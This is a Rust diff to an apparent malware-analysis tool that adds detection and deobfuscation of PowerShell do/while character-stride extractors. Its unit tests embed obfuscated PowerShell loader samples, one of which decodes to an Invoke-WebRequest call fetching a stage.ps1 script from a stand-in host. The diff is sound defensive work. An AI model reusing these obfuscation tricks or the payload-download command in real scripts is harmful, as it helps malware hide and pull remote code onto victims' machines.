@@ -2884,6 +2884,12 @@ static PS_VAR_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static PS_INT_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(\d{1,6})(?:\s*(?:;|\r?\n|$))"#)
+        .expect("ps int assign")
+});
+
+#[allow(clippy::expect_used)]
 static PS_VAR_APPEND_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*\+=\s*(?:'((?:''|[^'])*)'|"([^"`$\\]*(?:\\.[^"`$\\]*)*)")"#,
@@ -2940,6 +2946,45 @@ fn ps_literal_assignment_value(caps: &regex::Captures<'_>) -> Option<String> {
     caps.get(2)
         .map(|m| m.as_str().replace("''", "'"))
         .or_else(|| caps.get(3).map(|m| m.as_str().to_string()))
+}
+
+fn ps_integer_bindings(text: &str) -> std::collections::HashMap<String, usize> {
+    PS_INT_ASSIGN_RE
+        .captures_iter(text)
+        .filter_map(|caps| {
+            let name = caps.get(1)?.as_str().to_ascii_lowercase();
+            let value = caps.get(2)?.as_str().parse().ok()?;
+            Some((name, value))
+        })
+        .collect()
+}
+
+fn resolve_ps_usize_expr(
+    expr: &str,
+    bindings: &std::collections::HashMap<String, usize>,
+) -> Option<usize> {
+    let mut total = 0usize;
+    let mut saw_part = false;
+    for raw in expr.split('+') {
+        let part = raw.trim();
+        if part.is_empty() {
+            return None;
+        }
+        let value = if let Some(name) = part.strip_prefix('$') {
+            if !name
+                .chars()
+                .all(|ch| ch.is_ascii_alphanumeric() || ch == '_')
+            {
+                return None;
+            }
+            *bindings.get(&name.to_ascii_lowercase())?
+        } else {
+            part.parse().ok()?
+        };
+        total = total.checked_add(value)?;
+        saw_part = true;
+    }
+    saw_part.then_some(total)
 }
 
 fn expand_ps_index_concat_assignments(text: &str) -> String {
@@ -3836,13 +3881,24 @@ static FOR_SUBSTRING_INVOKE_STRIDE_DEF_RE: Lazy<Regex> = Lazy::new(|| {
     .expect("for substring invoke stride def")
 });
 
+#[allow(clippy::expect_used)]
+static DO_WHILE_STRIDE_DEF_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)[^)]*\)\s*\{[^{}]*?\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([^;\r\n{}]{1,128})[;\r\n]+[^{}]*?do\s*\{[^{}]*?\$\w+\s*\+=\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\][^{}]*?\$([A-Za-z_][A-Za-z0-9_]*)\s*\+=\s*(\d+)[^{}]*?\}\s*(?:until\s*\(\s*!\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]\s*\)|while\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]\s*\))"#,
+    )
+    .expect("do/while stride def")
+});
+
 fn contains_skip_nth_for_substring_shape(text: &str) -> bool {
-    if !contains_ascii_case_insensitive(text, "for(") {
+    if !contains_ascii_case_insensitive(text, "for(")
+        && !contains_ascii_case_insensitive(text, "do")
+    {
         return false;
     }
     contains_ascii_case_insensitive(text, "invoke")
         || contains_ascii_case_insensitive(text, "[$")
         || contains_ascii_case_insensitive(text, "until(")
+        || contains_ascii_case_insensitive(text, "while")
 }
 
 fn expand_skip_nth(text: &str) -> String {
@@ -3980,6 +4036,40 @@ fn expand_skip_nth_for_substring(text: &str) -> String {
         }
         Some((name, start, step))
     }));
+    let integer_bindings = ps_integer_bindings(text);
+    defs.extend(
+        DO_WHILE_STRIDE_DEF_RE
+            .captures_iter(text)
+            .filter_map(|caps| {
+                let name = caps.get(1)?.as_str().to_string();
+                let param_var = caps.get(2)?.as_str();
+                let init_var = caps.get(3)?.as_str();
+                let start_expr = caps.get(4)?.as_str();
+                let source_var = caps.get(5)?.as_str();
+                let index_ref_var = caps.get(6)?.as_str();
+                let inc_var = caps.get(7)?.as_str();
+                let step: usize = caps.get(8)?.as_str().parse().ok()?;
+                let (cond_source_var, cond_index_var) =
+                    if let (Some(source), Some(index)) = (caps.get(9), caps.get(10)) {
+                        (source.as_str(), index.as_str())
+                    } else {
+                        (caps.get(11)?.as_str(), caps.get(12)?.as_str())
+                    };
+                if !param_var.eq_ignore_ascii_case(source_var)
+                    || !param_var.eq_ignore_ascii_case(cond_source_var)
+                    || !init_var.eq_ignore_ascii_case(index_ref_var)
+                    || !init_var.eq_ignore_ascii_case(inc_var)
+                    || !init_var.eq_ignore_ascii_case(cond_index_var)
+                {
+                    return None;
+                }
+                let start = resolve_ps_usize_expr(start_expr, &integer_bindings)?;
+                if start > 512 || step == 0 || step > 32 {
+                    return None;
+                }
+                Some((name, start, step))
+            }),
+    );
     defs.extend(
         FOR_INDEX_STRIDE_DEF_RE
             .captures_iter(text)
@@ -4108,6 +4198,61 @@ mod skip_nth_for_substring_prefilter_tests {
     fn ignores_text_without_for_substring_shape() {
         let text = "Write-Host hello world";
         assert_eq!(expand_skip_nth_for_substring(text), text);
+    }
+
+    #[test]
+    fn do_while_stride_extractor_with_constant_sum_start_is_rewritten() {
+        let text = r#"$a=4;$b=55;function Pick ($value) {
+  $i=$a+$b
+  do {
+    $out += $value[$i]
+    $i += 5
+  } while ($value[$i])
+  $out
+}
+Pick 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxIxxxxnxxxxvxxxxoxxxxkxxxxexxxx-xxxxWxxxxexxxxbxxxxRxxxxexxxxqxxxxuxxxxexxxxsxxxxtxxxx xxxx-xxxxUxxxxrxxxxixxxx xxxxhxxxxtxxxxtxxxxpxxxxsxxxx:xxxx/xxxx/xxxxpxxxxsxxxx-xxxxsxxxxtxxxxrxxxxixxxxdxxxxexxxx-xxxxsxxxxuxxxxmxxxx.xxxxexxxxxxxxxaxxxxmxxxxpxxxxlxxxxexxxx/xxxxsxxxxtxxxxaxxxxgxxxxexxxx.xxxxpxxxxsxxxx1'"#;
+
+        let out = expand_skip_nth_for_substring(text);
+
+        assert!(
+            out.contains("'Invoke-WebRequest -Uri https://ps-stride-sum.example/stage.ps1'"),
+            "constant-sum do/while stride call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn do_while_stride_extractor_with_sample_syntax_is_rewritten() {
+        let text = "Powershell \"$preeditorially=4;$tungetalerens=55;helligaanden('Phlogisma Firsaarsfdselsdages Diastrophe Ungkokkens Gar????[IIIIi== =n,tttt: ::]y yy$ &&&t%%%rGGG,owwwwsddddrFFFFe<<<<tWWW nmmmmizzzznMMMMgVVVVeUU UrQQ.Q1ooo 4;;;;5 jjj MMMM-!!!!b tt.x');function helligaanden ($pauver) { $legman8=$preeditorially+$tungetalerens;\tdo  {$mitraille+=$pauver[$legman8];$legman8+=5} while  ($pauver[$legman8])$mitraille}\"";
+
+        let out = expand_skip_nth_for_substring(text);
+
+        assert!(
+            out.contains("'[int]$tGwdF<WmzMVUQo; M! '"),
+            "sample-syntax do/while stride call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn do_while_stride_extractor_call_inside_prior_function_is_rewritten() {
+        let text = concat!(
+            "$preeditorially=4;$tungetalerens=55;",
+            "function serviettens ($x) {",
+            "$haandhvende=helligaanden('Phlogisma Firsaarsfdselsdages Diastrophe Ungkokkens Gar????[IIIIi== =n,tttt: ::]y yy$ &&&t%%%rGGG,owwwwsddddrFFFFe<<<<tWWW nmmmmizzzznMMMMgVVVVeUU UrQQ.Q1ooo 4;;;;5 jjj MMMM-!!!!b tt.x')",
+            "};",
+            "function helligaanden ($pauver) {",
+            "$legman8=$preeditorially+$tungetalerens;",
+            "do {$mitraille+=$pauver[$legman8];$legman8+=5} while ($pauver[$legman8])",
+            "$mitraille",
+            "};",
+            "serviettens 'x'"
+        );
+
+        let out = expand_skip_nth_for_substring(text);
+
+        assert!(
+            out.contains("'[int]$tGwdF<WmzMVUQo; M! '"),
+            "do/while stride call inside prior function was not rewritten:\n{out}"
+        );
     }
 }
 
